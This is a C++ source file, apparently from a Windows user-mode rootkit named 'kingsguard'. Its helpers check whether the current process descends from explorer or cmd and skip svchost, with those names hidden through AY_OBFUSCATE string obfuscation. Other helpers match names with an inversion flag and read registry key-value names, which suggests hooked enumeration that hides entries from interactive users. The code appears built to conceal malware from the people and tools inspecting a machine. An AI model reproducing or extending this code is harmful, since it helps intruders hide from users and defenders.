#include "kingsguard.h"

DWORD GetPPID(DWORD pid)
{
    HANDLE h = NULL;
    PROCESSENTRY32 pe = { 0 };
    DWORD ppid = 0;
    pe.dwSize = sizeof(PROCESSENTRY32);
    h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(h, &pe))
    {
        do
        {
            if (pe.th32ProcessID == pid)
            {
                ppid = pe.th32ParentProcessID;
                break;
            }
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    return (ppid);
}

bool IsExplorerProcess(void)
{
    DWORD pid;
    char fname[MAX_PATH] = { 0 };
    pid = GetCurrentProcessId();
    std::string processName;

    do
    {
        if (pid == 0)
            return false;

        if (!GetProcessName(pid, fname, MAX_PATH))
        {
            processName = std::string(fname);
            if (processName.find(AY_OBFUSCATE("svchost")) != std::string::npos) // efficiency is key here
                return false;

            pid = GetPPID(pid);
        }
        else
        {
            return false;
        }
    } while (processName.find(AY_OBFUSCATE("explorer")) == std::string::npos && processName.find(AY_OBFUSCATE("cmd")) == std::string::npos);

    return true;
}

int GetProcessName(DWORD pid, char* fname, DWORD sz)
{
    HANDLE hProcess = NULL;
    int errorCode = 0;
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess)
    {
        GetProcessImageFileName(hProcess, fname, sz);
        CloseHandle(hProcess);
    }
    else
    {
        errorCode = GetLastError();
    }
    return errorCode;
}

bool CheckExistsA(std::string str, std::string value, bool enumerate)
{
    bool ret = false;
    std::transform(str.begin(), str.end(), str.begin(), tolower);

    if (str.find(value) != std::string::npos)
        ret = true;

    if (enumerate)
        ret = !ret;

    return ret;
}

bool CheckExistsW(std::wstring str, std::wstring value, bool enumerate)
{
    bool ret = false;
    std::transform(str.begin(), str.end(), str.begin(), towlower);

    if (str.find(value) != std::wstring::npos)
        ret = true;

    if (enumerate)
        ret = !ret;

    return ret;
}

PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass)
{
    switch (keyValueInformationClass)
    {
    case KeyValueBasicInformation:
        return ((PNT_KEY_VALUE_BASIC_INFORMATION)keyValueInformation)->Name;
    case KeyValueFullInformation:
        return ((PNT_KEY_VALUE_FULL_INFORMATION)keyValueInformation)->Name;
    default:
        return NULL;
    }
}